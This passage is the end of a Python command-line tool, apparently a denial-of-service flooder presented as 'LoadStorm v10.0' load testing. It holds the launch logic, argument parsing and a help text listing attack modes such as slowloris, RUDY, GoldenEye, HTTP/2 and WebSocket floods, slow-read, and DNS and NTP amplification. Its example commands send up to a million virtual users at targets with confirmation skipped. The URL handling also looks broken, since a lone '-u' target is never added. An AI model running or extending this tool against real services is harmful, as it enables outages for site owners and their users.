            print(f"    {Fore.WHITE}Dyn Scale:{Style.RESET_ALL}     {Fore.GREEN}Enabled{Style.RESET_ALL}")
        if self.cfg.get('scenarios'):
            print(f"    {Fore.WHITE}Scenarios:{Style.RESET_ALL}     {Fore.GREEN}{len(self.cfg['scenarios'])} steps{Style.RESET_ALL}")
        if self.cfg['rate_limit']:
            print(f"    {Fore.WHITE}Rate Limit:{Style.RESET_ALL}    {Fore.GREEN}{self.cfg['rate_limit']} req/s/user{Style.RESET_ALL}")
        if self.cfg['cache_bust']:
            print(f"    {Fore.WHITE}Cache Bust:{Style.RESET_ALL}    {Fore.GREEN}Enabled{Style.RESET_ALL}")
        if self.cfg.get('pool_size', 10) > 1:
            print(f"    {Fore.WHITE}Pool Size:{Style.RESET_ALL}     {Fore.GREEN}{self.cfg.get('pool_size', 10)} per worker{Style.RESET_ALL}")
        if self.cfg.get('tls_version'):
            print(f"    {Fore.WHITE}TLS Ver:{Style.RESET_ALL}      {Fore.GREEN}{self.cfg['tls_version']}{Style.RESET_ALL}")
        if self.cfg.get('cipher_suite'):
            print(f"    {Fore.WHITE}Ciphers:{Style.RESET_ALL}      {Fore.GREEN}{self.cfg['cipher_suite'][:50]}{Style.RESET_ALL}")
        if self.cfg.get('keepalive_timeout', 30) != 30:
            print(f"    {Fore.WHITE}KA Timeout:{Style.RESET_ALL}   {Fore.GREEN}{self.cfg['keepalive_timeout']}s{Style.RESET_ALL}")
        if self.cfg.get('http2_priority'):
            print(f"    {Fore.WHITE}H2 Priority:{Style.RESET_ALL}  {Fore.GREEN}Enabled{Style.RESET_ALL}")
        if self.cfg.get('correlation_ids', True):
            print(f"    {Fore.WHITE}Correlation:{Style.RESET_ALL}  {Fore.GREEN}Enabled{Style.RESET_ALL}")
        if self.cfg.get('validations'):
            print(f"    {Fore.WHITE}Validations:{Style.RESET_ALL}   {Fore.GREEN}{len(self.cfg['validations'])} rule set(s){Style.RESET_ALL}")
        if self.cfg.get('chain'):
            chain_desc = ','.join(f"{n}:{int(d)}s" for n, d in self.cfg['chain'])
            print(f"    {Fore.WHITE}Chain:{Style.RESET_ALL}        {Fore.GREEN}{chain_desc}{Style.RESET_ALL}")
        if self.cfg.get('multi_vector'):
            print(f"    {Fore.WHITE}Multi-Vector:{Style.RESET_ALL} {Fore.GREEN}{','.join(self.cfg['multi_vector'])}{Style.RESET_ALL}")
        if self.cfg.get('adaptive_intensity'):
            print(f"    {Fore.WHITE}Adaptive Intensity:{Style.RESET_ALL} {Fore.GREEN}Enabled{Style.RESET_ALL}")
        if self.cfg['pattern'] == AttackPattern.HLS_FLOOD:
            print(f"    {Fore.WHITE}HLS Segments:{Style.RESET_ALL} {Fore.GREEN}{self.cfg.get('hls_segments', 8)}{Style.RESET_ALL}")
        if self.cfg['pattern'] == AttackPattern.GRPC_FLOOD:
            print(f"    {Fore.WHITE}gRPC Streams:{Style.RESET_ALL} {Fore.GREEN}{self.cfg.get('grpc_streams', 20)}{Style.RESET_ALL}")
        if self.cfg['pattern'] == AttackPattern.SIP_FLOOD:
            print(f"    {Fore.WHITE}SIP Method:{Style.RESET_ALL}   {Fore.GREEN}{self.cfg.get('sip_method', 'INVITE')}{Style.RESET_ALL}")
        if self.cfg['pattern'] == AttackPattern.QUIC_FLOOD:
            print(f"    {Fore.WHITE}QUIC Packets:{Style.RESET_ALL} {Fore.GREEN}{self.cfg.get('quic_packets', 32)}/cycle port {self.cfg.get('quic_port', 443)}{Style.RESET_ALL}")
        if self.cfg['pattern'] == AttackPattern.DNS_AMPLIFICATION:
            print(f"    {Fore.WHITE}DNS Queries:{Style.RESET_ALL}  {Fore.GREEN}{self.cfg.get('dns_queries', 8)}/cycle port {self.cfg.get('dns_port', 53)}{Style.RESET_ALL}")
        if self.cfg['pattern'] == AttackPattern.NTP_AMPLIFICATION:
            print(f"    {Fore.WHITE}NTP Queries:{Style.RESET_ALL}  {Fore.GREEN}{self.cfg.get('ntp_queries', 4)}/cycle port {self.cfg.get('ntp_port', 123)}{Style.RESET_ALL}")
        if self.cfg['pattern'] == AttackPattern.WEBSOCKET_CHAT:
            room = self.cfg.get('ws_chat_room') or 'random'
            print(f"    {Fore.WHITE}WS Chat:{Style.RESET_ALL}      {Fore.GREEN}{self.cfg.get('ws_chat_count', 200)} msgs/cycle room={room}{Style.RESET_ALL}")
        if self.cfg['pattern'] == AttackPattern.GRAPHQL_FLOOD:
            print(f"    {Fore.WHITE}GraphQL:{Style.RESET_ALL}     {Fore.GREEN}depth={self.cfg.get('graphql_depth', 4)} batch={self.cfg.get('graphql_batch', 5)} streams={self.cfg.get('graphql_streams', 6)}{Style.RESET_ALL}")
        if self.cfg['pattern'] == AttackPattern.REST_FLOOD:
            rest_eps = self.cfg.get('rest_endpoints')
            print(f"    {Fore.WHITE}REST Flood:{Style.RESET_ALL}  {Fore.GREEN}parallel={self.cfg.get('rest_parallel', 4)} endpoints={len(rest_eps) if rest_eps else 'default'}{Style.RESET_ALL}")
        if self.cfg.get('smart_distribution'):
            print(f"    {Fore.WHITE}Smart Distribution:{Style.RESET_ALL} {Fore.GREEN}Enabled{Style.RESET_ALL}")
        if self.cfg.get('auto_tune'):
            print(f"    {Fore.WHITE}Auto-Tune:{Style.RESET_ALL}    {Fore.GREEN}Enabled{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}{'-'*74}{Style.RESET_ALL}")
        print()

        if not self.cfg['skip_confirm']:
            confirm = input(f"    {Fore.YELLOW}Ready to launch test? (y/N): {Style.RESET_ALL}").strip().lower()
            if confirm not in ('y', 'yes'):
                print(f"\n    {Fore.RED}Test cancelled.{Style.RESET_ALL}\n")
                return

        self.running = True
        self.metrics.start_time = time.time()
        self.metrics.record_timeline_event('start', f"test started - {self.cfg['pattern'].value}")
        if self._chain_resolved:
            self.metrics.record_timeline_event(
                'phase', f"chain configured with {len(self._chain_resolved)} phases")
        if self._multi_vectors:
            names = ','.join(p.value for p in self._multi_vectors)
            self.metrics.record_timeline_event('vector', f"multi-vector: {names}")

        await self._pre_resolve_dns()

        connector = self._get_connector()
        self._sem = asyncio.Semaphore(self.cfg['concurrency'])

        print(f"\n    {Fore.GREEN}{Style.BRIGHT}>>> Launching {self.cfg['users']:,} virtual users ({self.cfg['pattern'].value} pattern)...{Style.RESET_ALL}\n")

        timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            display_task = asyncio.create_task(self._display_loop())
            timer_task = asyncio.create_task(self._timer())
            launch_task = asyncio.create_task(self._adaptive_launcher(session))

            await asyncio.gather(launch_task, timer_task, return_exceptions=True)

            self._stop.set()
            self.running = False
            self.metrics.end_time = time.time()

            for task in asyncio.all_tasks():
                if task != asyncio.current_task() and not task.done():
                    task.cancel()

        print('\n' * 25)
        self.print_report()

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        if self.cfg['export'] in ('all', 'json'):
            self.export_json(f"loadstorm_{ts}.json")
        if self.cfg['export'] in ('all', 'csv'):
            self.export_csv(f"loadstorm_{ts}.csv")
        if self.cfg['export'] in ('all', 'html'):
            self.export_html(f"loadstorm_{ts}.html")
        print(f"    {Fore.GREEN}Reports saved successfully!{Style.RESET_ALL}")
        print()


def parse_headers(header_list: list) -> dict:
    headers = {}
    for h in header_list:
        if ':' in h:
            key, val = h.split(':', 1)
            headers[key.strip()] = val.strip()
    return headers


def _disable_colors():
    global Fore, Style, Back
    class _NC:
        def __getattr__(self, n): return ''
    Fore = Style = Back = _NC()


ALL_PATTERNS = [
    'constant', 'ramp', 'spike', 'wave', 'stepped', 'pulse', 'targeted',
    'staircase', 'elastic', 'random_chaos', 'slowloris', 'rudy', 'goldeneye',
    'multipart', 'xmlrpc', 'endless_data', 'header_flood', 'post_large_body',
    'h2_flood', 'websocket_flood', 'slow_read', 'cache_bypass',
    'hls_flood', 'grpc_flood', 'sip_flood',
    'quic_flood', 'dns_amplification', 'ntp_amplification',
    'websocket_chat', 'graphql_flood', 'rest_flood',
]


def main():
    parser = argparse.ArgumentParser(
        prog='loadstorm',
        description=f'{Fore.RED}{Style.BRIGHT}LoadStorm v10.0 - Ultimate Load Testing Tool{Style.RESET_ALL}',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""{Fore.CYAN}Attack Patterns:{Style.RESET_ALL}
  constant    - All users hit simultaneously
  ramp        - Gradual increase over duration (default)
  spike       - Sudden burst, rest, burst again
  wave        - Sinusoidal wave pattern
  stepped     - Increase in discrete steps
  pulse       - Periodic bursts
  targeted    - Ramp up, hold, ramp down
  staircase   - Incremental steps with holds
  elastic     - Expand and contract dynamically
  random_chaos - Unpredictable fluctuations
  slowloris   - Slow POST attack (keeps connections alive)
  rudy        - R-U-Dead-Yet (one byte at a time)
  goldeneye   - HTTP keep-alive + cache bypass
  multipart   - Multipart POST form flood
  xmlrpc      - XML-RPC multicall flood (WordPress)
  endless_data - Send endless data until server closes
  header_flood - Flood with thousands of headers
  post_large_body - Send very large POST bodies
  h2_flood   - HTTP/2 stream multiplexing flood
  websocket_flood - WebSocket message flood
  slow_read  - Slow read attack (reads responses slowly)
  cache_bypass - Cache bypass flood with unique URLs
  hls_flood  - HLS/DASH manifest + segment flood
  grpc_flood - gRPC streaming flood (framed POST streams)
  sip_flood  - SIP INVITE/REGISTER flood over TCP
  quic_flood - HTTP/3 QUIC UDP Initial packet flood
  dns_amplification - DNS amplification query simulation (ANY/DNSKEY/EDNS)
  ntp_amplification - NTP mode-7 monlist query simulation
  websocket_chat - WebSocket chat room message flood
  graphql_flood - GraphQL introspection/nested/batch query flood
  rest_flood - REST API endpoint rotation flood (GET/POST/PUT/PATCH/DELETE)

{Fore.CYAN}Examples:{Style.RESET_ALL}
  {Fore.GREEN}# 1000 users, ramp pattern{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 1000

  {Fore.GREEN}# 1 MILLION users spike attack{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 1000000 -d 60 -C 50000 -p spike -y

  {Fore.GREEN}# Multi-URL testing{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 10000 --urls urls.txt

  {Fore.GREEN}# WebSocket testing with binary messages + reconnection{Style.RESET_ALL}
  python loadstorm.py -u wss://echo.websocket.org -c 100 --websocket -y

  {Fore.GREEN}# Slowloris attack simulation{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 500 -p slowloris -y

  {Fore.GREEN}# XML-RPC flood (WordPress){Style.RESET_ALL}
  python loadstorm.py -u https://wordpress-site.com/xmlrpc.php -c 1000 -p xmlrpc -y

  {Fore.GREEN}# With response validation and detailed logs{Style.RESET_ALL}
  python loadstorm.py -u https://api.target.com -c 5000 --validate-status 200 --detailed-logs -y

  {Fore.GREEN}# Geographic simulation{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 100000 --geo-sim -y

  {Fore.GREEN}# Adaptive rate control{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 50000 --adaptive -y

  {Fore.GREEN}# HTTP/2 with connection pooling{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 10000 --http2 --pool-size 20 -y

  {Fore.GREEN}# Dynamic scaling based on error rates{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 50000 --dynamic-scale -y

  {Fore.GREEN}# Header flood attack{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 500 -p header_flood --header-flood-count 10000 -y

  {Fore.GREEN}# WebSocket with frame fragmentation{Style.RESET_ALL}
  python loadstorm.py -u wss://echo.websocket.org -c 100 --websocket --ws-fragment 1024 -y

  {Fore.GREEN}# HTTP/2 stream multiplexing flood{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 500 -p h2_flood --h2-streams 200 --http2 -y

  {Fore.GREEN}# WebSocket message flood{Style.RESET_ALL}
  python loadstorm.py -u wss://target.com/ws -c 100 -p websocket_flood --ws-flood-count 5000 -y

  {Fore.GREEN}# Slow read attack{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 200 -p slow_read --slow-read-chunk 1 --slow-read-delay 0.5 -y

  {Fore.GREEN}# Cache bypass flood{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 1000 -p cache_bypass --cache-bust -y

  {Fore.GREEN}# Custom TLS and cipher suite{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 5000 --tls-version TLSv1.3 --cipher-suite ECDHE-RSA-AES256-GCM-SHA384 -y

  {Fore.GREEN}# HTTP/2 with priority hints{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 10000 --http2 --http2-priority -y

  {Fore.GREEN}# HLS/DASH manifest flood{Style.RESET_ALL}
  python loadstorm.py -u https://target.com/hls/master.m3u8 -c 500 -p hls_flood --hls-segments 12 -y

  {Fore.GREEN}# gRPC streaming flood{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 300 -p grpc_flood --grpc-streams 50 --grpc-messages 20 -y

  {Fore.GREEN}# SIP protocol flood{Style.RESET_ALL}
  python loadstorm.py -u sip:target.com -c 200 -p sip_flood --sip-method INVITE --sip-port 5060 -y

  {Fore.GREEN}# Custom validation rules + correlation IDs{Style.RESET_ALL}
  python loadstorm.py -u https://api.target.com -c 1000 --validate-rule status:eq:200 --validate-rule body:contains:ok --detailed-logs -y

  {Fore.GREEN}# QUIC/HTTP3 flood simulation{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 500 -p quic_flood --quic-packets 64 --quic-port 443 -y

  {Fore.GREEN}# DNS amplification query simulation (direct to authorized target){Style.RESET_ALL}
  python loadstorm.py -u dns://target-dns-server -c 200 -p dns_amplification --dns-port 53 -y

  {Fore.GREEN}# NTP monlist query simulation (direct to authorized target){Style.RESET_ALL}
  python loadstorm.py -u ntp://target-ntp-server -c 100 -p ntp_amplification --ntp-port 123 -y

  {Fore.GREEN}# Attack pattern chaining: ramp -> spike -> slowloris{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 5000 -d 60 --chain "ramp:20,spike:20,slowloris:20" -y

  {Fore.GREEN}# Multi-vector attack simulation{Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 2000 -d 45 --multi-vector "ramp,h2_flood,slow_read,quic_flood" -y

  {Fore.GREEN}# Adaptive attack intensity (auto ramp based on error rates){Style.RESET_ALL}
  python loadstorm.py -u https://target.com -c 10000 -d 60 --adaptive-intensity --dynamic-scale -y

  {Fore.GREEN}# WebSocket chat room flood{Style.RESET_ALL}
  python loadstorm.py -u wss://target.com/chat -c 200 -p websocket_chat --ws-chat-count 500 --ws-chat-room lobby -y

  {Fore.GREEN}# GraphQL query flood{Style.RESET_ALL}
  python loadstorm.py -u https://target.com/graphql -c 500 -p graphql_flood --graphql-depth 5 --graphql-batch 8 -y

  {Fore.GREEN}# REST API endpoint flood{Style.RESET_ALL}
  python loadstorm.py -u https://api.target.com -c 1000 -p rest_flood --rest-endpoints "/api/v1/users,/api/v1/orders" -y

  {Fore.GREEN}# Auto-tuning + smart load distribution + health monitoring{Style.RESET_ALL}
  python loadstorm.py -u https://target.com --urls urls.txt -c 5000 -d 60 --auto-tune --smart-distribution -y
"""
    )

    parser.add_argument('-u', '--url', help='Target URL (primary)')
    parser.add_argument('-c', '--count', type=int, default=100, help='Virtual users (default: 100, max: 10000000)')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Duration in seconds (default: 30)')
    parser.add_argument('-C', '--concurrency', type=int, default=500, help='Max concurrent connections (default: 500)')
    parser.add_argument('-p', '--pattern', default='ramp',
                        choices=ALL_PATTERNS,
                        help='Attack pattern (default: ramp)')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD'],
                        help='HTTP method (default: GET)')
    parser.add_argument('-H', '--header', action='append', default=[], help='Custom headers (repeatable)')
    parser.add_argument('-b', '--body', help='Request body')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout per request (default: 10)')
    parser.add_argument('-B', '--batch-size', type=int, default=500, help='Users per launch batch (default: 500)')
    parser.add_argument('--no-keep-alive', action='store_true', help='Disable keep-alive')
    parser.add_argument('--rate-limit', type=int, default=0, help='Requests/sec per user (0=unlimited)')
    parser.add_argument('--payload-file', help='File with payloads (1 per line)')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--no-follow', action='store_true', help='No redirect following')
    parser.add_argument('--no-color', action='store_true', help='Disable colors')
    parser.add_argument('--cache-bust', action='store_true', help='Enable cache busting')
    parser.add_argument('--jitter', type=int, default=0, help='Random delay per request in ms (0=none)')
    parser.add_argument('--random-path', action='store_true', help='Use random URL paths per request')
    parser.add_argument('--random-referer', action='store_true', help='Random Referer headers')
    parser.add_argument('-y', '--yes', action='store_true', help='Skip confirmation')
    parser.add_argument('--export', default='all', choices=['all', 'json', 'csv', 'html', 'none'],
                        help='Report export format (default: all)')
    parser.add_argument('--urls', help='File with multiple URLs (one per line)')
    parser.add_argument('--websocket', action='store_true', help='Enable WebSocket mode')
    parser.add_argument('--validate-status', type=int, help='Validate response status code')
    parser.add_argument('--validate-contains', help='Validate response contains text')
    parser.add_argument('--validate-max-time', type=float, help='Validate max response time (ms)')
    parser.add_argument('--geo-sim', action='store_true', help='Enable geographic distribution simulation')
    parser.add_argument('--adaptive', action='store_true', help='Enable adaptive rate control')
    parser.add_argument('--dynamic-scale', action='store_true', help='Enable dynamic worker scaling based on error rates')
    parser.add_argument('--scenario', help='JSON file with scenario chain')
    parser.add_argument('--detailed-logs', action='store_true', help='Log every request for CSV export')
    parser.add_argument('--http2', action='store_true', help='Enable HTTP/2 with ALPN negotiation')
    parser.add_argument('--pool-size', type=int, default=10, help='Per-worker connection pool size (default: 10)')
    parser.add_argument('--ws-msg-type', default='text', choices=['text', 'binary', 'ping'],
                        help='WebSocket message type (default: text)')
    parser.add_argument('--ws-msg-size', type=int, default=64, help='WebSocket message size in bytes (default: 64)')
    parser.add_argument('--ws-reconnect', type=int, default=3, help='WebSocket reconnect attempts (default: 3)')
    parser.add_argument('--ws-freq', type=float, default=0.0, help='WebSocket msg frequency, msgs/sec (0=unlimited)')
    parser.add_argument('--ws-fragment', type=int, default=0, help='WebSocket fragment size (0=no fragmentation)')
    parser.add_argument('--ws-payload-hex', help='WebSocket custom payload as hex string')
    parser.add_argument('--header-flood-count', type=int, default=5000, help='Number of headers for header_flood (default: 5000)')
    parser.add_argument('--tls-version', help='TLS version (TLSv1.2, TLSv1.3)')
    parser.add_argument('--cipher-suite', help='Custom cipher suite (e.g. ECDHE-RSA-AES128-GCM-SHA256)')
    parser.add_argument('--keepalive-timeout', type=int, default=30, help='Connection keep-alive timeout in seconds (default: 30)')
    parser.add_argument('--http2-priority', action='store_true', help='Enable HTTP/2 priority hints')
    parser.add_argument('--h2-streams', type=int, default=100, help='Number of concurrent H2 streams for h2_flood (default: 100)')
    parser.add_argument('--ws-flood-count', type=int, default=1000, help='Number of messages for websocket_flood (default: 1000)')
    parser.add_argument('--slow-read-chunk', type=int, default=1, help='Bytes per read for slow_read (default: 1)')
    parser.add_argument('--slow-read-delay', type=float, default=0.1, help='Delay between reads in seconds for slow_read (default: 0.1)')
    parser.add_argument('--hls-segments', type=int, default=8, help='Segments/variants to fetch per hls_flood cycle (default: 8)')
    parser.add_argument('--grpc-streams', type=int, default=20, help='Parallel gRPC calls per grpc_flood cycle (default: 20)')
    parser.add_argument('--grpc-messages', type=int, default=10, help='Framed messages per gRPC body (default: 10)')
    parser.add_argument('--grpc-method', help='gRPC method path, e.g. pkg.Service/Method (random if omitted)')
    parser.add_argument('--sip-method', default='INVITE', choices=['INVITE', 'REGISTER', 'OPTIONS', 'SUBSCRIBE', 'MESSAGE'],
                        help='SIP method for sip_flood (default: INVITE)')
    parser.add_argument('--sip-port', type=int, default=5060, help='SIP target port (default: 5060)')
    parser.add_argument('--no-correlation-ids', action='store_true', help='Disable X-Correlation-ID request headers')
    parser.add_argument('--validate-regex', help='Validate response body against a regex')
    parser.add_argument('--validate-not-contains', help='Validate response body does NOT contain text')
    parser.add_argument('--validate-min-size', type=int, help='Validate minimum response size in bytes')
    parser.add_argument('--validate-max-size', type=int, help='Validate maximum response size in bytes')
    parser.add_argument('--validate-content-type', help='Validate Content-Type header contains text')
    parser.add_argument('--validate-rule', action='append', default=[],
                        help='Custom validation rule field:op:value (repeatable), e.g. status:eq:200, body:contains:ok, time_ms:lt:1500')
    parser.add_argument('--chain', help='Attack pattern chain, e.g. "ramp:20,spike:20,slowloris:20" (pattern:seconds)')
    parser.add_argument('--multi-vector', help='Comma-separated patterns run concurrently per worker, e.g. ramp,h2_flood,slow_read')
    parser.add_argument('--adaptive-intensity', action='store_true',
                        help='Automatically scale attack intensity based on error rates and latency')
    parser.add_argument('--quic-packets', type=int, default=32,
                        help='QUIC Initial packets per cycle for quic_flood (default: 32)')
    parser.add_argument('--quic-port', type=int, default=443, help='QUIC/UDP target port (default: 443)')
    parser.add_argument('--dns-port', type=int, default=53, help='DNS/UDP target port for dns_amplification (default: 53)')
    parser.add_argument('--dns-queries', type=int, default=8,
                        help='DNS queries per cycle for dns_amplification (default: 8)')
    parser.add_argument('--ntp-port', type=int, default=123, help='NTP/UDP target port for ntp_amplification (default: 123)')
    parser.add_argument('--ntp-queries', type=int, default=4,
                        help='NTP monlist queries per cycle for ntp_amplification (default: 4)')
    parser.add_argument('--ws-chat-count', type=int, default=200,
                        help='Chat messages per cycle for websocket_chat (default: 200)')
    parser.add_argument('--ws-chat-room', default=None,
                        help='Chat room name for websocket_chat (random if omitted)')
    parser.add_argument('--graphql-endpoint', default=None,
                        help='Explicit GraphQL endpoint URL (auto-appends /graphql if omitted)')
    parser.add_argument('--graphql-depth', type=int, default=4,
                        help='Nesting depth for GraphQL queries (default: 4)')
    parser.add_argument('--graphql-batch', type=int, default=5,
                        help='Queries per GraphQL batch payload (default: 5)')
    parser.add_argument('--graphql-streams', type=int, default=6,
                        help='Parallel GraphQL calls per cycle (default: 6)')
    parser.add_argument('--rest-endpoints', default=None,
                        help='Comma-separated REST endpoint paths (default: built-in API paths)')
    parser.add_argument('--rest-methods', default=None,
                        help='Comma-separated REST methods, e.g. GET,POST,PUT (default: mixed)')
    parser.add_argument('--rest-parallel', type=int, default=4,
                        help='Parallel REST calls per cycle (default: 4)')
    parser.add_argument('--smart-distribution', dest='smart_distribution', action='store_true',
                        default=True,
                        help='Smart load distribution across URLs based on observed health (default: on)')
    parser.add_argument('--no-smart-distribution', dest='smart_distribution', action='store_false',
                        help='Disable smart load distribution (random URL selection)')
    parser.add_argument('--auto-tune', action='store_true',
                        help='Auto-tune worker delay and batch size based on live metrics')
    parser.add_argument('--ramp-up', type=int, default=0, help='(Deprecated: use -p ramp)')

    args = parser.parse_args()

    if args.no_color:
        _disable_colors()

    if not args.url and not args.urls:
        parser.error("Either -u/--url or --urls is required")

    urls = []
    if args.urls and os.path.exists(args.urls):
        with open(args.urls, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]

        if args.url:
            if not args.url.startswith(('http://', 'https://', 'ws://', 'wss://', 'sip://', 'sips://',
                                        'dns://', 'ntp://', 'quic://')):
                args.url = 'https://' + args.url
        if args.url not in urls:
            urls.insert(0, args.url)

    if not urls:
        parser.error("No valid URLs provided")

    pattern_map = {p: AttackPattern(p) for p in ALL_PATTERNS}

    chain = []
    if args.chain:
        chain = parse_chain_spec(args.chain)
        if not chain:
            print(f"    {Fore.YELLOW}[!] --chain parsed to empty; ignoring chain{Style.RESET_ALL}")

    multi_vector = []
    if args.multi_vector:
        for name in args.multi_vector.split(','):
            name = name.strip().lower()
            if not name:
                continue
            if name in pattern_map:
                multi_vector.append(name)
            else:
                print(f"    {Fore.YELLOW}[!] Unknown multi-vector pattern ignored: {name}{Style.RESET_ALL}")

    if chain and multi_vector:
        print(f"    {Fore.YELLOW}[!] Both --chain and --multi-vector set; chain phases take precedence for pattern selection{Style.RESET_ALL}")

    payloads = []
    if args.payload_file and os.path.exists(args.payload_file):
        with open(args.payload_file, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]

    custom_rules = []
    for rule_spec in args.validate_rule:
        parsed_rule = parse_validation_rule(rule_spec)
        if parsed_rule:
            custom_rules.append(parsed_rule)
        else:
            print(f"    {Fore.YELLOW}[!] Ignoring invalid --validate-rule: {rule_spec}{Style.RESET_ALL}")

    validations = []
    if (args.validate_status or args.validate_contains or args.validate_max_time
            or args.validate_regex or args.validate_not_contains
            or args.validate_min_size is not None or args.validate_max_size is not None
            or args.validate_content_type or custom_rules):
        validations.append(ResponseValidation(
            expected_status=args.validate_status,
            contains=args.validate_contains,
            max_response_time=args.validate_max_time,
            regex=args.validate_regex,
            not_contains=args.validate_not_contains,
            min_size=args.validate_min_size,
            max_size=args.validate_max_size,
            content_type_contains=args.validate_content_type,
            custom_rules=custom_rules,
        ))

    scenarios = []
    if args.scenario and os.path.exists(args.scenario):
        with open(args.scenario, 'r') as f:
            scenario_data = json.load(f)
            for step_data in scenario_data.get('steps', []):
                validation = None
                if 'validation' in step_data:
                    v = step_data['validation']
                    validation = ResponseValidation(
                        expected_status=v.get('status'),
                        min_size=v.get('min_size'),
                        max_size=v.get('max_size'),
                        contains=v.get('contains'),
                        not_contains=v.get('not_contains'),
                        regex=v.get('regex'),
                        content_type_contains=v.get('content_type_contains'),
                        max_response_time=v.get('max_response_time'),
                        custom_rules=v.get('custom_rules', []),
                    )
                scenarios.append(ScenarioStep(
                    url=step_data['url'],
                    method=step_data.get('method', 'GET'),
                    headers=step_data.get('headers', {}),
                    body=step_data.get('body'),
                    body_file=step_data.get('body_file'),
                    validation=validation,
                    weight=step_data.get('weight', 1),
                    cookies=step_data.get('cookies', {}),
                    ws_message_type=step_data.get('ws_message_type', 'text'),
                    ws_message_size=step_data.get('ws_message_size', 64),
                    ws_ping_interval=step_data.get('ws_ping_interval', 0.0),
                    ws_reconnect_attempts=step_data.get('ws_reconnect_attempts', 3),
                    ws_message_frequency=step_data.get('ws_message_frequency', 0.0),
                    ws_fragment_size=step_data.get('ws_fragment_size', 0),
                    ws_custom_payload_hex=step_data.get('ws_custom_payload_hex'),
                    assertions=step_data.get('assertions', []),
                ))

    cfg = {
        'url': urls[0] if urls else '',
        'urls': urls,
        'users': args.count,
        'duration': args.duration,
        'concurrency': args.concurrency,
        'pattern': pattern_map[args.pattern],
        'method': args.method,
        'headers': parse_headers(args.header),
        'body': args.body,
        'timeout': args.timeout,
        'keep_alive': not args.no_keep_alive,
        'rate_limit': args.rate_limit,
        'payloads': payloads,
        'proxy': args.proxy,
        'follow': not args.no_follow,
        'cache_bust': args.cache_bust,
        'skip_confirm': args.yes,
        'batch_size': args.batch_size,
        'export': args.export,
        'jitter': args.jitter,
        'random_path': args.random_path,
        'random_referer': args.random_referer,
        'websocket': args.websocket,
        'geo_simulation': args.geo_sim,
        'adaptive_rate': args.adaptive,
        'dynamic_scale': args.dynamic_scale,
        'validations': validations,
        'scenarios': scenarios,
        'detailed_logs': args.detailed_logs,
        'http2': args.http2,
        'pool_size': args.pool_size,
        'ws_msg_type': args.ws_msg_type,
        'ws_msg_size': args.ws_msg_size,
        'ws_reconnect': args.ws_reconnect,
        'ws_freq': args.ws_freq,
        'ws_fragment': args.ws_fragment,
        'ws_payload_hex': args.ws_payload_hex,
        'header_flood_count': args.header_flood_count,
        'tls_version': args.tls_version,
        'cipher_suite': args.cipher_suite,
        'keepalive_timeout': args.keepalive_timeout,
        'http2_priority': args.http2_priority,
        'h2_streams': args.h2_streams,
        'ws_flood_count': args.ws_flood_count,
        'slow_read_chunk': args.slow_read_chunk,
        'slow_read_delay': args.slow_read_delay,
        'hls_segments': args.hls_segments,
        'grpc_streams': args.grpc_streams,
        'grpc_messages': args.grpc_messages,
        'grpc_method': args.grpc_method,
        'sip_method': args.sip_method,
        'sip_port': args.sip_port,
        'correlation_ids': not args.no_correlation_ids,
        'chain': chain,
        'multi_vector': multi_vector,
        'adaptive_intensity': args.adaptive_intensity,
        'quic_packets': args.quic_packets,
        'quic_port': args.quic_port,
        'dns_port': args.dns_port,
        'dns_queries': args.dns_queries,
        'ntp_port': args.ntp_port,
        'ntp_queries': args.ntp_queries,
        'ws_chat_count': args.ws_chat_count,
        'ws_chat_room': args.ws_chat_room,
        'graphql_endpoint': args.graphql_endpoint,
        'graphql_depth': args.graphql_depth,
        'graphql_batch': args.graphql_batch,
        'graphql_streams': args.graphql_streams,
        'rest_endpoints': [p.strip() for p in args.rest_endpoints.split(',')] if args.rest_endpoints else None,
        'rest_methods': [mth.strip().upper() for mth in args.rest_methods.split(',')] if args.rest_methods else None,
        'rest_parallel': args.rest_parallel,
        'smart_distribution': args.smart_distribution,
        'auto_tune': args.auto_tune,
        'worker_delay': 0,
    }

    def signal_handler(sig, frame):
        print(f"\n\n    {Fore.RED}[!] Test interrupted by user{Style.RESET_ALL}")
        engine._stop.set()
        engine.running = False
        engine.metrics.end_time = time.time()
        engine.print_report()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    engine = StormEngine(cfg)
    asyncio.run(engine.run())


if __name__ == '__main__':
    main()
